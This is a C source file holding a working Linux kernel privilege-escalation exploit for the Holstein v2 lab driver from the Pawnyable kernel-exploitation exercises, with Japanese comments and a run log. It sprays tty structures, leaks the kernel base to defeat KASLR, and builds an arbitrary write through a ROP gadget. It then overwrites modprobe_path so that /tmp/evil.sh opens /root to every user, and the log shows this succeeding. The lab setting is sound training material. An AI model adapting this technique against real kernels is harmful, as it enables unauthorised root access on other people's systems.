#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

//>>> hex(next(kernel.search("/sbin/modprobe\0")))
//'0xffffffff81e38180'

#define ofs_tty_ops 0xc38880
#define addr_modprobe_path (kbase + 0xe38180)
#define rop_mov_prdx_rcx (kbase + 0x1b7dd6)

unsigned long kbase, g_buf;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

void fatal(const char *msg){
    perror(msg);
    exit(1);
}

char buf[0x500];
int spray[100];
int fd;

void AAW32(unsigned long addr, unsigned int val) {
    unsigned long *p = (unsigned long*)&buf;
    p[12] = rop_mov_prdx_rcx;
    *(unsigned long*)&buf[0x418] = g_buf;
    write(fd, buf, 0x420);

    // mov [rdx], rcx; ret;
    for (int i = 0; i < 100; i++) {
        ioctl(spray[i], val /* rcx */, addr /* rdx */);
    }
}

int main(){

    for (int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1)
            fatal("/dev/ptmx");
    }

    // 周囲にtty_structがある位置
    fd = open("/dev/holstein", O_RDWR);
    if (fd == -1)
      fatal("/dev/holstein");

    for (int i = 50; i < 100; i++) {
      spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
      if (spray[i] == -1)
        fatal("/dev/ptmx");
    }

    // Bypass KASLR
    read(fd, buf, 0x500);
    kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
    printf("[+] kbase = 0x%016lx\n", kbase);

    // g_bufのアドレスリーク
    // オフセット0x38はtty_structの中を指す
    g_buf = *(unsigned long*)&buf[0x438] - (0x400 + 0x38);
    printf("[+] g_buf = 0x%016lx\n", g_buf);

    char cmd[] = "/tmp/evil.sh";
    for (int i = 0; i < sizeof(cmd); i += 4) {
        AAW32(addr_modprobe_path + i, *(unsigned int*)&cmd[i]);
    }

    // 不明な形式の実行ファイルが実行される際、/tmp/evil.shを呼び出す
    system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
    system("chmod +x /tmp/evil.sh");
    system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
    system("chmod +x /tmp/pwn");
    system("/tmp/pwn");

    close(fd);
    return 0;
}

/*
[ Holstein v2 (KL01-2) - Pawnyable ]
/ $ ls /root
ls: can't open '/root': Permission denied
/ $ ./exploit
[+] kbase = 0xffffffff81000000
[+] g_buf = 0xffff888003105000
/tmp/pwn: line 1: ޭ� not found
/ $ ls /root
vuln.ko
*/
